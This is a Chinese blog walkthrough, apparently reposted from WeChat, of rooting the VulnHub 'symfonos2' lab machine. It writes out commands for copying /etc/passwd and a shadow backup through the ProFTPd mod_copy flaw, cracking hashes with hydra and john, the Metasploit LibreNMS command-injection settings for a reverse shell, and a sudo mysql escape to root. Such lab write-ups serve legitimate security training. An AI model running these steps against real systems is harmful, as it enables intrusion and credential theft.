# vulnhub之symfonos2的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745566&idx=1&sn=faf39daca881c3948514d2753d3b7790&chksm=87148bdeb06302c825037c54630db0c10fa98d1256db34b145edd6030f857a573ea09769f287&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745566&idx=1&sn=faf39daca881c3948514d2753d3b7790&chksm=87148bdeb06302c825037c54630db0c10fa98d1256db34b145edd6030f857a573ea09769f287&scene=27#wechat_redirect)

本周实践的是vulnhub的symfonos2镜像，下载地址，https://download.vulnhub.com/symfonos/symfonos2.7z，

在WorkStation下导入，启动后就能看到dhcp到的地址，就省的扫描了，

![](../Images/38a1199be294db1d3841d66abc9dfc8b.png)

直接对这个地址做服务扫描，sudo nmap -sS -sV -A -p- 192.168.137.231

能看到开了ftp，ssh，web，文件共享，

![](../Images/2442d560fe0e2bd5b9b98872c1643602.png)

先看一下文件共享是啥情况，匿名可访问到一个日志文件，从日志文件里能看到很多有用的信息，比如共享路径，

![](../Images/7b7aed741289a9829b8a96bc52dfe968.png)

对扫描到的ftp软件版本做攻击方法搜索，sudo searchsploit proftpd 1.3.5

发现有一个文件拷贝漏洞，

![](../Images/d623253a88c88668f161b428d728a7b6.png)

从网上搜这种攻击方法如何利用，这两篇都很有指导价值，

https://packetstormsecurity.com/files/131505/ProFTPd-1.3.5-File-Copy.html，

https://www.exploit-db.com/exploits/36742，

直接ftp访问命令行就能操作，都用不上metasploit，

把passwd文件拷贝到共享目录，

site cpfr /etc/passwd，

site cpto /home/aeolus/share/passwd.txt，

拷贝shadow文件时发现权限不够，但是在文件共享目录的日志文件里发现了这个信息，shadow文件曾经被备份到过另一个路径下，

![](../Images/62b7a2a00f37573d6128380f9d5ce18d.png)

拷贝这个路径下的文件就有权限了，  

site cpfr /var/backups/shadow.bak，

site cpto /home/aeolus/share/shadow.txt

效果如下，

![](../Images/f4b93e524b23edf07f9e532b1e14b0c7.png)

passwd和shadow文件就都被拷贝到共享目录了，

![](../Images/73079dfe5f9d342ab6301131a6a68cf3.png)

把两个文件都搞到kali下，先合并，sudo unshadow passwd.txt shadow.txt > passwords.txt，

然后先准备一个字典文件用来做密码破解，

cd /usr/share/wordlists，sudo gunzip rockyou.txt.gz，

通过之前的日志文件能看到ftp有aeolus账户，

![](../Images/c2eab59e91654426259bc81dccf3b30c.png)

则可以通过hydra做ftp密码的破解，

sudo hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://192.168.137.231，

很快就能破解成功，得到密码sergioteamo，

![](../Images/a10a0a7e01f2a11f1b998eac6f592346.png)

这个方法其实不好，虽然快，但很容易被入侵防御设备发现，不如在本地用john破解，但是时间要很长，

sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt，

![](../Images/1ff9e3699a428114dde9ad56de9705ae.png)

sudo john --show passwords.txt，

![](../Images/eefe254f0ee6864deaea1bb09089655d.png)

拿到aeolus账户的密码了，就可以ssh登录了，发现这个账户的权限很小，连sudo的权限都没有，没法儿提权，还得想别的路子，

![](../Images/5a9a392b61265c07ff279b5ac943a8b6.png)

用这个账户在系统里翻看，看到web服务竟然还有8080端口，

![](../Images/f47e8171cbec21b79913473e20fd39a3.png)

但是外面只能看到80端口，而且访问到的就一张图片，没任何用处，

![](../Images/756821e1d44922ef5e59a8bd6bbcace1.png)

于是想到通过ssh端口转发的方法访问一下8080端口看看是啥，

ssh -L 8080:127.0.0.1:8080 aeolus@192.168.137.231，

![](../Images/d1440894477deaf2fbc744365cb3f846.png)

用aeolus的账户密码还能登录，但是也没啥用，

![](../Images/3f852cb0db02da95f2a717de6a130ce7.png)

对扫描到的web软件做攻击方法搜索，sudo searchsploit librenms，

![](../Images/6615070d777f799f88bda7d129262c97.png)

发现有一个addhost漏洞，

还是上网搜具体的攻击方法，可以直接用metasploit攻击，

https://www.rapid7.com/db/modules/exploit/linux/http/librenms\_addhost\_cmd\_inject，走起，

use exploit/linux/http/librenms\_addhost\_cmd\_inject  
set USERNAME aeolus  
set PASSWORD sergioteamo  
set RHOSTS 127.0.0.1  
set RPORT 8080  
set LHOST 192.168.137.2

show options

![](../Images/28de0b30c44c2ec2765e97fa636f5466.png)

攻击成功，能拿到反弹shell，同时发现这个反弹shell的账户有sudo权限，且可执行mysql程序，

在这个网站里可以搜到很多软件程序的提权命令，包括mysql，

https://gtfobins.github.io/，  

具体方法是：sudo mysql -e '\\! /bin/sh'，这就提权成功了，

![](../Images/5da8d00032908e6bbecd17651aa6c643.png)

至此CTF完成，算了别叫CTF了，我这个其实就是拿root权限，以后咱们就直接叫拿root权限成功。
